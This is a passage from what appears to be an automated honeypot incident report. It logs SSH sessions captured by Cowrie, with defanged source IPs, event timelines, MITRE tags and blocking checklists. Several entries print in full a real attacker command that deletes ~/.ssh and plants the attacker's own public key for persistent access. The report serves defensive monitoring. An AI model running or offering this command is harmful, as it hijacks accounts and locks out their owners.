| `2026-07-02 14:54:53` | `cowrie.client.version` |
| `2026-07-02 14:54:53` | `cowrie.client.kex` |
| `2026-07-02 14:54:59` | `cowrie.login.success` |
| `2026-07-02 14:55:04` | `cowrie.session.params` |
| `2026-07-02 14:55:04` | `cowrie.command.input` |
| `2026-07-02 14:55:06` | `cowrie.log.closed` |
| `2026-07-02 14:55:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f70ca22eede7

| Field | Detail |
|---|---|
| **Source IP** | `162.243.147[.]237` |
| **First Seen** | 2026-07-02 14:55 |
| **Last Seen** | 2026-07-02 14:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 14:55:55` | `cowrie.session.connect` |
| `2026-07-02 14:55:55` | `cowrie.client.version` |
| `2026-07-02 14:55:55` | `cowrie.client.kex` |
| `2026-07-02 14:55:56` | `cowrie.login.success` |
| `2026-07-02 14:55:56` | `cowrie.session.params` |
| `2026-07-02 14:55:56` | `cowrie.command.input` |
| `2026-07-02 14:55:56` | `cowrie.command.failed` |
| `2026-07-02 14:55:57` | `cowrie.log.closed` |
| `2026-07-02 14:55:57` | `cowrie.session.params` |
| `2026-07-02 14:55:57` | `cowrie.command.input` |
| `2026-07-02 14:55:57` | `cowrie.session.file_download` |
| `2026-07-02 14:55:57` | `cowrie.log.closed` |
| `2026-07-02 14:55:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `162.243.147[.]237` to AbuseIPDB if not already reported
- [ ] Block `162.243.147[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0b859e2060c

| Field | Detail |
|---|---|
| **Source IP** | `162.243.147[.]237` |
| **First Seen** | 2026-07-02 14:55 |
| **Last Seen** | 2026-07-02 14:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 14:55:57` | `cowrie.session.connect` |
| `2026-07-02 14:55:57` | `cowrie.client.version` |
| `2026-07-02 14:55:57` | `cowrie.client.kex` |
| `2026-07-02 14:55:58` | `cowrie.login.success` |
| `2026-07-02 14:55:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `162.243.147[.]237` to AbuseIPDB if not already reported
- [ ] Block `162.243.147[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34973688705a

| Field | Detail |
|---|---|
| **Source IP** | `162.243.147[.]237` |
| **First Seen** | 2026-07-02 14:55 |
| **Last Seen** | 2026-07-02 14:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 14:55:58` | `cowrie.session.connect` |
| `2026-07-02 14:55:58` | `cowrie.client.version` |
| `2026-07-02 14:55:58` | `cowrie.client.kex` |
| `2026-07-02 14:55:58` | `cowrie.login.success` |
| `2026-07-02 14:55:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `162.243.147[.]237` to AbuseIPDB if not already reported
- [ ] Block `162.243.147[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffdf271b708e

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-02 14:56 |
| **Last Seen** | 2026-07-02 14:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 14:56:26` | `cowrie.session.connect` |
| `2026-07-02 14:56:26` | `cowrie.client.version` |
| `2026-07-02 14:56:26` | `cowrie.client.kex` |
| `2026-07-02 14:56:27` | `cowrie.login.success` |
| `2026-07-02 14:56:28` | `cowrie.session.params` |
| `2026-07-02 14:56:28` | `cowrie.command.input` |
| `2026-07-02 14:56:28` | `cowrie.log.closed` |
| `2026-07-02 14:56:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3864274e798

| Field | Detail |
|---|---|
| **Source IP** | `58.229.141[.]26` |
| **First Seen** | 2026-07-02 14:59 |
| **Last Seen** | 2026-07-02 14:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 14:59:00` | `cowrie.session.connect` |
| `2026-07-02 14:59:00` | `cowrie.client.version` |
| `2026-07-02 14:59:01` | `cowrie.client.kex` |
| `2026-07-02 14:59:01` | `cowrie.login.success` |
| `2026-07-02 14:59:02` | `cowrie.session.params` |
| `2026-07-02 14:59:02` | `cowrie.command.input` |
| `2026-07-02 14:59:02` | `cowrie.command.failed` |
| `2026-07-02 14:59:03` | `cowrie.log.closed` |
| `2026-07-02 14:59:04` | `cowrie.session.params` |
| `2026-07-02 14:59:04` | `cowrie.command.input` |
| `2026-07-02 14:59:04` | `cowrie.session.file_download` |
| `2026-07-02 14:59:04` | `cowrie.log.closed` |
| `2026-07-02 14:59:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.229.141[.]26` to AbuseIPDB if not already reported
- [ ] Block `58.229.141[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e38d348a18b6

| Field | Detail |
|---|---|
| **Source IP** | `58.229.141[.]26` |
| **First Seen** | 2026-07-02 14:59 |
| **Last Seen** | 2026-07-02 14:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 14:59:04` | `cowrie.session.connect` |
| `2026-07-02 14:59:04` | `cowrie.client.version` |
| `2026-07-02 14:59:04` | `cowrie.client.kex` |
| `2026-07-02 14:59:05` | `cowrie.login.success` |
| `2026-07-02 14:59:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.229.141[.]26` to AbuseIPDB if not already reported
- [ ] Block `58.229.141[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98870d95bd4f

| Field | Detail |
|---|---|
| **Source IP** | `58.229.141[.]26` |
| **First Seen** | 2026-07-02 14:59 |
| **Last Seen** | 2026-07-02 14:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 14:59:05` | `cowrie.session.connect` |
| `2026-07-02 14:59:05` | `cowrie.client.version` |
| `2026-07-02 14:59:05` | `cowrie.client.kex` |
| `2026-07-02 14:59:06` | `cowrie.login.success` |
| `2026-07-02 14:59:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.229.141[.]26` to AbuseIPDB if not already reported
- [ ] Block `58.229.141[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d18f5f336ea

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-02 15:00 |
| **Last Seen** | 2026-07-02 15:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 15:00:42` | `cowrie.session.connect` |
| `2026-07-02 15:00:42` | `cowrie.client.version` |
| `2026-07-02 15:00:42` | `cowrie.client.kex` |
| `2026-07-02 15:00:42` | `cowrie.login.success` |
| `2026-07-02 15:00:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79b94a4884e6

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-02 15:00 |
| **Last Seen** | 2026-07-02 15:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 15:00:42` | `cowrie.session.connect` |
| `2026-07-02 15:00:42` | `cowrie.client.version` |
| `2026-07-02 15:00:42` | `cowrie.client.kex` |
| `2026-07-02 15:00:42` | `cowrie.login.success` |
| `2026-07-02 15:00:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f88160a0856

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-02 15:00 |
| **Last Seen** | 2026-07-02 15:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 15:00:46` | `cowrie.session.connect` |
| `2026-07-02 15:00:46` | `cowrie.client.version` |
| `2026-07-02 15:00:46` | `cowrie.client.kex` |
| `2026-07-02 15:00:47` | `cowrie.login.success` |
| `2026-07-02 15:00:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7f33e8f2260

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-02 15:00 |
| **Last Seen** | 2026-07-02 15:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 15:00:47` | `cowrie.session.connect` |
| `2026-07-02 15:00:47` | `cowrie.client.version` |
| `2026-07-02 15:00:47` | `cowrie.client.kex` |
| `2026-07-02 15:00:48` | `cowrie.login.success` |
| `2026-07-02 15:00:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a654c8c0adba

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 15:02 |
| **Last Seen** | 2026-07-02 15:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 15:02:47` | `cowrie.session.connect` |
| `2026-07-02 15:02:47` | `cowrie.client.version` |
| `2026-07-02 15:02:47` | `cowrie.client.kex` |
| `2026-07-02 15:02:49` | `cowrie.login.success` |
| `2026-07-02 15:02:51` | `cowrie.session.params` |
| `2026-07-02 15:02:51` | `cowrie.command.input` |
| `2026-07-02 15:02:51` | `cowrie.log.closed` |
| `2026-07-02 15:02:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94e17517c059

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 15:06 |
| **Last Seen** | 2026-07-02 15:06 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 15:06:17` | `cowrie.session.connect` |
| `2026-07-02 15:06:18` | `cowrie.client.version` |
| `2026-07-02 15:06:18` | `cowrie.client.kex` |
| `2026-07-02 15:06:24` | `cowrie.login.success` |
| `2026-07-02 15:06:28` | `cowrie.session.params` |
| `2026-07-02 15:06:28` | `cowrie.command.input` |
| `2026-07-02 15:06:29` | `cowrie.log.closed` |
| `2026-07-02 15:06:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cd53e18580f

| Field | Detail |
|---|---|
| **Source IP** | `118.193.61[.]170` |
| **First Seen** | 2026-07-02 15:08 |
| **Last Seen** | 2026-07-02 15:09 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 15:08:56` | `cowrie.session.connect` |
| `2026-07-02 15:08:56` | `cowrie.client.version` |
| `2026-07-02 15:08:57` | `cowrie.client.kex` |
| `2026-07-02 15:08:57` | `cowrie.login.success` |
| `2026-07-02 15:08:58` | `cowrie.session.params` |
| `2026-07-02 15:08:58` | `cowrie.command.input` |
| `2026-07-02 15:08:58` | `cowrie.command.failed` |
| `2026-07-02 15:08:59` | `cowrie.log.closed` |
| `2026-07-02 15:09:00` | `cowrie.session.params` |
| `2026-07-02 15:09:00` | `cowrie.command.input` |
| `2026-07-02 15:09:00` | `cowrie.session.file_download` |
| `2026-07-02 15:09:00` | `cowrie.log.closed` |
| `2026-07-02 15:09:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.61[.]170` to AbuseIPDB if not already reported
- [ ] Block `118.193.61[.]170` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2629cb71386

| Field | Detail |
|---|---|
| **Source IP** | `118.193.61[.]170` |
| **First Seen** | 2026-07-02 15:09 |
| **Last Seen** | 2026-07-02 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 15:09:00` | `cowrie.session.connect` |
| `2026-07-02 15:09:00` | `cowrie.client.version` |
| `2026-07-02 15:09:00` | `cowrie.client.kex` |
| `2026-07-02 15:09:01` | `cowrie.login.success` |
| `2026-07-02 15:09:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.61[.]170` to AbuseIPDB if not already reported
- [ ] Block `118.193.61[.]170` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e25803fe034

| Field | Detail |
|---|---|
| **Source IP** | `118.193.61[.]170` |
| **First Seen** | 2026-07-02 15:09 |
| **Last Seen** | 2026-07-02 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 15:09:01` | `cowrie.session.connect` |
| `2026-07-02 15:09:01` | `cowrie.client.version` |
| `2026-07-02 15:09:01` | `cowrie.client.kex` |
| `2026-07-02 15:09:02` | `cowrie.login.success` |
| `2026-07-02 15:09:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.61[.]170` to AbuseIPDB if not already reported
- [ ] Block `118.193.61[.]170` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c312f6db7865

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]103` |
| **First Seen** | 2026-07-02 15:11 |
| **Last Seen** | 2026-07-02 15:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 15:11:52` | `cowrie.session.connect` |
| `2026-07-02 15:11:52` | `cowrie.client.version` |
| `2026-07-02 15:11:52` | `cowrie.client.kex` |
| `2026-07-02 15:11:53` | `cowrie.login.success` |
| `2026-07-02 15:11:54` | `cowrie.session.params` |
| `2026-07-02 15:11:54` | `cowrie.command.input` |
| `2026-07-02 15:11:54` | `cowrie.command.failed` |
| `2026-07-02 15:11:55` | `cowrie.log.closed` |
| `2026-07-02 15:11:55` | `cowrie.session.params` |
| `2026-07-02 15:11:55` | `cowrie.command.input` |
| `2026-07-02 15:11:56` | `cowrie.session.file_download` |
| `2026-07-02 15:11:56` | `cowrie.log.closed` |
| `2026-07-02 15:11:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]103` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbe2447e3524

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]103` |
| **First Seen** | 2026-07-02 15:11 |
| **Last Seen** | 2026-07-02 15:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 15:11:56` | `cowrie.session.connect` |
| `2026-07-02 15:11:56` | `cowrie.client.version` |
| `2026-07-02 15:11:56` | `cowrie.client.kex` |
| `2026-07-02 15:11:57` | `cowrie.login.success` |
| `2026-07-02 15:11:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]103` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-594a511f25d3

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]103` |
| **First Seen** | 2026-07-02 15:11 |
| **Last Seen** | 2026-07-02 15:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 15:11:58` | `cowrie.session.connect` |
| `2026-07-02 15:11:58` | `cowrie.client.version` |
| `2026-07-02 15:11:58` | `cowrie.client.kex` |
| `2026-07-02 15:11:59` | `cowrie.login.success` |
| `2026-07-02 15:11:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]103` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de3af93b1b3f

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 15:16 |
| **Last Seen** | 2026-07-02 15:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 15:16:40` | `cowrie.session.connect` |
| `2026-07-02 15:16:41` | `cowrie.client.version` |
| `2026-07-02 15:16:41` | `cowrie.client.kex` |
| `2026-07-02 15:16:43` | `cowrie.login.success` |
| `2026-07-02 15:16:44` | `cowrie.session.params` |
| `2026-07-02 15:16:44` | `cowrie.command.input` |
| `2026-07-02 15:16:45` | `cowrie.log.closed` |
| `2026-07-02 15:16:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49afb88b6310

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 15:17 |
| **Last Seen** | 2026-07-02 15:18 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 15:17:58` | `cowrie.session.connect` |
| `2026-07-02 15:17:59` | `cowrie.client.version` |
| `2026-07-02 15:17:59` | `cowrie.client.kex` |
| `2026-07-02 15:18:05` | `cowrie.login.success` |
| `2026-07-02 15:18:09` | `cowrie.session.params` |
| `2026-07-02 15:18:09` | `cowrie.command.input` |
| `2026-07-02 15:18:10` | `cowrie.log.closed` |
| `2026-07-02 15:18:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba907a2e57b4

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]75` |
| **First Seen** | 2026-07-02 15:28 |
| **Last Seen** | 2026-07-02 15:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 15:28:21` | `cowrie.session.connect` |
| `2026-07-02 15:28:21` | `cowrie.client.version` |
| `2026-07-02 15:28:22` | `cowrie.client.kex` |
| `2026-07-02 15:28:23` | `cowrie.login.success` |
| `2026-07-02 15:28:24` | `cowrie.session.params` |
| `2026-07-02 15:28:24` | `cowrie.command.input` |
| `2026-07-02 15:28:24` | `cowrie.command.failed` |
| `2026-07-02 15:28:24` | `cowrie.log.closed` |
| `2026-07-02 15:28:25` | `cowrie.session.params` |
| `2026-07-02 15:28:25` | `cowrie.command.input` |
